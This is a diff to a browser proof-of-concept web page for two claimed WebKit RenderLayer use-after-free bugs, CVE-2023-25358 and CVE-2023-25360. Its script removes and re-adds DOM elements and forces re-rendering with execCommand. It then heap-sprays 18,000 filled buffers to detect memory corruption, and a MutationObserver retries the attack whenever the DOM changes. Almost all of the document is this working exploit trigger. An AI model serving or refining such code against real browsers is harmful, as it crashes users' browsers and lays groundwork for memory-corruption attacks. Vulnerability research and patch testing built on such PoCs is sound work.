@@ -3,100 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2023-25358 PoC</title>
+    <title>CVE-2023-25358 & CVE-2023-25360 PoC</title>
     <style>
-        #victim {
+        #element1, #element2 {
             position: absolute;
-            width: 150px;
-            height: 150px;
+            width: 180px;
+            height: 180px;
             overflow: hidden;
-            background: red;
+            background: purple;
         }
-        #newChild {
-            width: 50px;
-            height: 50px;
-            background: yellow;
+        #element2 {
+            background: orange;
+            left: 200px;
+        }
+        #newElement {
+            width: 60px;
+            height: 60px;
+            background: cyan;
         }
         button {
-            margin: 15px 0;
-            padding: 10px;
-            font-size: 16px;
+            margin: 20px 0;
+            padding: 12px;
+            font-size: 18px;
             cursor: pointer;
         }
         #status {
-            margin-top: 8px;
+            margin-top: 10px;
             font-weight: bold;
-            color: darkred;
+            color: darkblue;
         }
     </style>
 </head>
 <body>
-    <h1>CVE-2023-25358: RenderLayer::addChild UAF</h1>
+    <h1>CVE-2023-25358 & CVE-2023-25360: RenderLayer UAF</h1>
     <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
     <button id="trigger">Trigger PoC</button>
-    <div id="status">Ready...</div>
+    <div id="status">Waiting...</div>
     <div id="container">
-        <div id="victim"></div>
+        <div id="element1"></div>
+        <div id="element2"></div>
     </div>
     <script>
         const container = document.getElementById('container');
-        const victim = document.getElementById('victim');
+        const element1 = document.getElementById('element1');
+        const element2 = document.getElementById('element2');
         const status = document.getElementById('status');
         let attemptCount = 0;
 
         function sprayHeap() {
-            const buffers = [];
-            for (let i = 0; i < 12000; i++) {
+            const arrays = [];
+            for (let i = 0; i < 18000; i++) {
                 const buf = new Uint8Array(4096);
-                buf.fill(0x43); // Fill with 'C'
-                buffers.push(buf);
+                buf.fill(0x44); // Fill with 'D'
+                arrays.push(buf);
             }
-            return buffers;
+            return arrays;
         }
 
         function triggerExploit() {
             attemptCount++;
-            console.log(`Attempt ${attemptCount}: Initiating...`);
-            status.textContent = `Attempt ${attemptCount} running...`;
+            console.log(`Attempt ${attemptCount}: Starting exploit...`);
+            status.textContent = `Attempt ${attemptCount} in progress...`;
 
-            // Step 1: Remove element to free RenderLayer
-            victim.style.display = 'block';
-            container.removeChild(victim);
+            // Step 1: Remove elements to free RenderLayer
+            element1.style.display = 'block';
+            element2.style.display = 'block';
+            container.removeChild(element1);
+            container.removeChild(element2);
 
-            // Step 2: Add new element and update render tree
+            // Step 2: Manipulate DOM and trigger render tree updates
             setTimeout(() => {
                 try {
-                    // Add new child to trigger addChild
-                    const newChild = document.createElement('div');
-                    newChild.id = 'newChild';
-                    newChild.style.width = '50px';
-                    newChild.style.height = '50px';
-                    newChild.style.background = 'yellow';
-                    container.appendChild(newChild);
-                    // execCommand to force render tree update
+                    // Re-add element1 for CVE-2023-25360 (renderer)
+                    container.appendChild(element1);
+                    // Add new element for CVE-2023-25358 (addChild)
+                    const newElement = document.createElement('div');
+                    newElement.id = 'newElement';
+                    newElement.style.width = '60px';
+                    newElement.style.height = '60px';
+                    newElement.style.background = 'cyan';
+                    container.appendChild(newElement);
+                    // Multiple execCommand to maximize render tree updates
+                    document.execCommand('fontSize', false, '6');
                     document.execCommand('bold', false, null);
                     // Spray heap
-                    const buffers = sprayHeap();
+                    const arrays = sprayHeap();
                     // Check for UAF
-                    console.log('Probing for UAF...');
-                    for (let i = 0; i < buffers.length; i++) {
-                        if (buffers[i][0] !== 0x43) {
+                    console.log('Checking for UAF...');
+                    for (let i = 0; i < arrays.length; i++) {
+                        if (arrays[i][0] !== 0x44) {
                             console.log(`UAF detected at index ${i}`);
                             status.textContent = 'UAF detected!';
                             return;
                         }
                     }
-                    console.log('Exploit attempt done, check for crash.');
+                    console.log('Exploit completed, check for crash.');
                     status.textContent = 'Exploit attempted!';
                 } catch (err) {
                     console.error(`Error: ${err.message}`);
                     status.textContent = 'Failed: Error occurred.';
                 }
-            }, 75);
+            }, 60);
         }
 
         const observer = new MutationObserver(() => {
-            console.log('DOM modified, retrying exploit...');
+            console.log('DOM changed, retrying exploit...');
             triggerExploit();
         });
 
